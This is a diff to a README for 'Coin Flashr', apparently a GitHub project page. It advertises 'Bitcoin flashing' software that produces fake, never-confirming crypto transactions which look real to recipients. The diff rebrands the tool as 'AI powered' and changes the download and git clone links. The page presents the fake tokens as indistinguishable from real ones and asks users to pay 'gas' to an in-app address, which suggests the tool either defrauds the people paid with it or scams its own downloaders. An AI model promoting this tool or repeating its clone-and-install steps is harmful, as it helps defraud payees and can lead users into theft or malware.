@@ -4,16 +4,16 @@
 
 Bitcoin flashing is a technique that creates the illusion of a successful Bitcoin transaction, manipulate the receiver's local display to show a fake balance. It is an unconfirmed transaction that will eventually be rejected by the blockchain. This is achieved either by manipulating the transaction signature and the gas fee programatically.
 
-### Bitcoin flashing software public release
+### First AI Powered Bitcoin flashing software public release
 
-Coin Flashr is a software application that lets users perform dummy transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20) in less than a minute. This tool can be used on mobile and PC. We developed this software mainly as a proof-of-concept, and only for demonstration purposes. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity. The practical use case is transfers between cold and hardware wallets. The bitcoin can be sent to an exchange platform, but confirmation will never happen. Flash tokens are identical to the real deal until the user studies the underlying code or attempt to swap them.
+Coin Flashr is the first AI powered software application that lets users perform demo bitcoin flashing with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20) in less than a minute. This tool can be used on mobile and PC. We developed this software mainly as a proof-of-concept, and only for demonstration purposes. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity. The practical use case is transfers between cold and hardware wallets. The bitcoin can be sent to an exchange platform, but confirmation will never happen. Flash tokens are identical to the real deal until the user studies the underlying code or attempt to swap them.
 
 The user will have a limited spendable quota of either Bitcoin or USDT, and is responsible for the gas fee for the flashing transactions. The user will find a gas address in-app and the gas topup process is simple.
 
 
 ### Bitcoin flashing mobile app (Android/IOS)
 
-Click [here](https://github.com/bitcoin-flashing-mobile-app/public-release) to flash Bitcoin from your mobile phone.
+Click [here](https://github.com/bitcoin-flashing-mobile-ai/public-release) to flash Bitcoin from your mobile phone.
 
 ### Bitcoin flashing source code
 
@@ -115,7 +115,7 @@ You should see output similar to: git version 2.x.x
 1. Clone the repository:
 
 ```sh
-git clone https://github.com/bitcoin-flashing-free/public-release && cd public-release
+git clone https://github.com/bitcoin-flashing-ai/public-release && cd public-release
 ```
 
 2. Install necessary dependencies:
@@ -133,15 +133,10 @@ Gas is required for every non-bitcoin (USDT, wBTC) flashing event.
 
 ### Bitcoin flashing software PC preview
 
-https://github.com/user-attachments/assets/2aa6d8e3-a91f-4866-ad24-fa5d3cb9cef0
+https://github.com/user-attachments/assets/bab25483-3e27-4374-b889-82ec070d37cf
+
+
 
 ### Bitcoin flashing software iPhone preview
 
-https://github.com/user-attachments/assets/1c3f0a92-a67b-446c-bcf8-233ccf94460b
-
-
-
-
-
-
-
+https://github.com/user-attachments/assets/88ffe1b0-2dd0-47a1-9b43-8e398103484a
